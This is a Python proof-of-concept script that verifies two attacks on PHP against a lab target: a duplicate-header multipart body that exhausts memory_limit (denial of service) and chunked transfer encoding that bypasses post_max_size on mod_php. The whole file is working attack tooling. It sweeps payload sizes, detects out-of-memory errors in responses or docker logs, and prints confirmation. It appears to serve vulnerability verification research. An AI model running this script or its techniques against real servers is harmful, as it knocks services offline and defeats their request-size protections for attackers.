#!/usr/bin/env python3
"""Verify the duplicate-header memory amplification and the chunked
post_max_size bypass against a lab target.

Public lineage:
  - dinosn/php-cve-2026-10961x-lab-poc: 52x amplification (6-byte header
    lines -> ~314-byte smart_str); 2.57 MB OOMs a 128 MB limit.
  - 9bie/php2shell-bypass-aslr-exp: chunked multipart skips the declared
    Content-Length gate on mod_php.
  - Assetnote scanner: nested 62-level key probes (oracle only; low
    amplification, documented as such).

The target must be a lab with `display_errors=On` (so the OOM message is
readable) or an error log we can inspect; the lab-pure-modphp `php8m`
service (:18111) is exactly this shape.

Usage:
  python3 poc/verify_amplification.py --target http://127.0.0.1:18111
  python3 poc/verify_amplification.py --target http://127.0.0.1:18110 --mb 2
"""

import argparse
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import amplify, probe

OOM_RE = re.compile(rb"Allowed memory size of (\d+) bytes exhausted")


def oom_from_container(container, since="2m"):
    """Read the OOM line from a lab container's log when display_errors=Off."""
    try:
        r = subprocess.run(
            ["docker", "logs", "--since", since, container],
            capture_output=True, text=True, timeout=20,
        )
    except Exception:
        return None
    m = OOM_RE.search(((r.stdout or "") + (r.stderr or "")).encode("latin-1"))
    return int(m.group(1)) if m else None


def read_limits(host, port):
    resp = probe.http_get(host, port, "/probe.php", timeout=10, recv_timeout=8)
    text = probe.body(resp).decode("latin-1", "replace")
    out = {}
    for line in text.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            if k in ("memory_limit", "post_max_size", "max_input_vars"):
                out[k] = v.strip()
    return out


def human_to_bytes(v):
    v = (v or "").strip()
    if not v or v == "-1":
        return None
    mult = {"K": 1024, "M": 1024 ** 2, "G": 1024 ** 3}
    try:
        return int(v[:-1]) * mult[v[-1:].upper()] if v[-1:].isalpha() else int(v)
    except (ValueError, KeyError):
        return None


def send_amp(host, port, mb, chunked=False):
    body = amplify.duplicate_header_body(int(mb * 1024 * 1024))
    if chunked:
        resp = amplify.send_chunked(
            host, port, "/index.php", body, "multipart/form-data",
            boundary="AMP",
        )
    else:
        resp = amplify.send_declared(
            host, port, "/index.php", body, "multipart/form-data",
            boundary="AMP",
        )
    return resp, len(body)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18111")
    ap.add_argument("--mb", type=float, default=None,
                    help="wire megabytes (default: sweep 0.5,1,2,3,4)")
    ap.add_argument("--chunked", action="store_true",
                    help="also send the same body chunked (mod_php bypass)")
    ap.add_argument("--container", default=None,
                    help="lab container name to read the OOM log from when "
                         "display_errors is Off (e.g. php2shell-pure-modphp-8m)")
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    lim = read_limits(host, port)
    mem = human_to_bytes(lim.get("memory_limit"))
    post = human_to_bytes(lim.get("post_max_size"))
    print("[*] Duplicate-header amplification / chunked bypass")
    print(f"    target: {host}:{port}")
    print(f"    memory_limit={lim.get('memory_limit')}  "
          f"post_max_size={lim.get('post_max_size')}  "
          f"max_input_vars={lim.get('max_input_vars')}")
    print()

    sizes = [args.mb] if args.mb else [0.5, 1, 2, 3, 4]
    best = None
    for mb in sizes:
        try:
            resp, wire = send_amp(host, port, mb)
        except (OSError, ValueError) as e:
            print(f"  [{mb:>4} MB] send error: {e}")
            continue
        b = resp
        m = OOM_RE.search(b)
        exhausted = m.group(1).decode() if m else None
        if exhausted is None and args.container and "500" in probe.status(resp):
            logged = oom_from_container(args.container)
            exhausted = str(logged) if logged else None
        status = probe.status(resp)
        print(f"  [{mb:>4} MB wire] {status}  "
              f"oom={exhausted or '-'}  body={len(b)} B")
        if exhausted:
            best = (mb, wire, int(exhausted))
            break
        if post and wire > post and "413" in status:
            print("        (rejected by post_max_size; try --chunked)")

    print()
    if best:
        mb, wire, exhausted = best
        n = amplify.duplicate_header_count(int(mb * 1024 * 1024))
        ratio_wire = (exhausted / wire) if wire else 0
        print("[EVIDENCE] DUPLICATE-HEADER AMPLIFICATION REPRODUCED")
        print(f"    - {wire/1024/1024:.2f} MB of wire ({n} header lines)")
        print(f"      exhausted a {exhausted/1024/1024:.0f} MB memory_limit.")
        print(f"    - wire -> heap ratio ~{ratio_wire:.1f}x")
        if post and wire < post:
            print(f"    - the body stayed under post_max_size ({post/1024/1024:.0f} MB):")
            print("      the practical upload barrier is defeated while the")
            print("      wire is legal.")
        print("    - Honest ceiling: this is a DoS/OOM producer, not the")
        print("      corruption-to-RCE step (see docs/ANALYSIS.md §0.5).")
        rc = 0
    else:
        print("[!] No OOM observed in the swept sizes.")
        print("    The target may be patched (8.4.27+ filters unknown")
        print("    headers), display_errors may be off, or the limit is")
        print("    above the tested wire. Try a larger --mb or check the")
        print("    container log for 'Allowed memory size'.")
        rc = 1

    if args.chunked:
        print()
        print("[*] Chunked delivery on the same body (mod_php gate control):")
        body = amplify.duplicate_header_body(9 * 1024 * 1024)
        ctrl = amplify.send_declared(host, port, "/probe.php", body,
                                     "multipart/form-data", boundary="AMP")
        test = amplify.send_chunked(host, port, "/probe.php", body,
                                    "multipart/form-data", boundary="AMP")
        ctrl_txt = probe.body(ctrl).decode("latin-1", "replace")
        test_txt = probe.body(test).decode("latin-1", "replace")
        print(f"    control (Content-Length): {probe.status(ctrl)}")
        print(f"    chunked (no length):      {probe.status(test)}")
        if "exceeds the limit" in ctrl_txt and "POST count:" in test_txt:
            print("[EVIDENCE] CHUNKED BYPASS CONFIRMED on mod_php: declared")
            print("    body rejected by post_max_size; the same body chunked")
            print("    was parsed (see poc/verify_postmax_bypass.py for the")
            print("    full per-SAPI boundary).")
        elif "POST count:" in test_txt:
            print("[*] chunked request parsed (no gate rejection observed)")
        else:
            print("[*] inconclusive: tune --mb / inspect the error log")

    return rc


if __name__ == "__main__":
    raise SystemExit(main())
